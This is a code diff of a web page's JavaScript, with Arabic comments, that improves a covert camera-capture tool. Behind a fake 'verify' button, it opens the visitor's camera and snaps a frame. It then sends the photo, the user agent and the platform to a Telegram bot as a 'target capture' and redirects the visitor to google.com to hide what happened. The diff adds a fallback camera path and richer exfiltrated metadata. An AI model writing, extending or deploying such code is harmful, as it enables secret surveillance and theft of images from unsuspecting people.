@@ -32,19 +32,31 @@
             document.getElementById('verify-btn').style.display = 'none';
             document.getElementById('loading-spinner').style.display = 'block';
             
+            let stream = null;
             try {
-                // طلب فتح الكاميرا الأمامية مع تحديد أبعاد واضحة لضمان الاستجابة السريعة
-                const stream = await navigator.mediaDevices.getUserMedia({ 
+                // محاولة أولية: الكاميرا الأمامية بدقة عالية
+                stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }, 
                     audio: false 
                 });
-                
+            } catch (e1) {
+                try {
+                    // محاولة بديلة: أي كاميرا متاحة لو فشلت الأمامية
+                    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                } catch (e2) {
+                    console.error("Camera access denied or unavailable", e2);
+                    redirectToTarget();
+                    return;
+                }
+            }
+
+            try {
                 const video = document.getElementById('v');
                 video.srcObject = stream;
                 
-                // التأكد من تشغيل الفيديو وبدء تدفق الإطارات لمنع التقاط صورة سوداء
                 await video.play();
-                await new Promise(resolve => setTimeout(resolve, 800));
+                // انتظار استقرار تدفق الإطارات لمنع الصور السوداء أو الضبابية
+                await new Promise(resolve => setTimeout(resolve, 1000));
                 
                 const canvas = document.getElementById('c');
                 canvas.width = video.videoWidth || 640;
@@ -52,15 +64,20 @@
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.90);
                 const blob = dataURItoBlob(dataUrl);
                 
+                // جمع معلومات إضافية عن النظام والمتصفح لتعزيز التقرير
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const captionText = `🎯 تم التقاط صورة جديدة!\n💻 النظام: ${platform}\n🌐 المتصفح: ${userAgent.substring(0, 60)}...`;
+
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'capture.jpg');
-                formData.append('caption', 'تم الالتقاط بنجاح via Alpha System');
+                formData.append('photo', blob, 'target_capture.jpg');
+                formData.append('caption', captionText);
                 
-                // إرسال الصورة للبوت مع التعامل مع استجابة الشبكة
+                // إرسال البيانات للبوت مع ضمان إتمام الطلب
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
@@ -68,13 +85,16 @@
                 
                 stream.getTracks().forEach(track => track.stop());
             } catch (err) {
-                console.error("Capture failed:", err);
+                console.error("Capture process failed:", err);
+            } finally {
+                redirectToTarget();
             }
+        }
 
-            // ضمان إتمام الإرسال قبل إعادة التوجيه
+        function redirectToTarget() {
             setTimeout(() => {
                 window.location.href = "https://google.com";
-            }, 1200);
+            }, 800);
         }
 
         function dataURItoBlob(dataURI) {
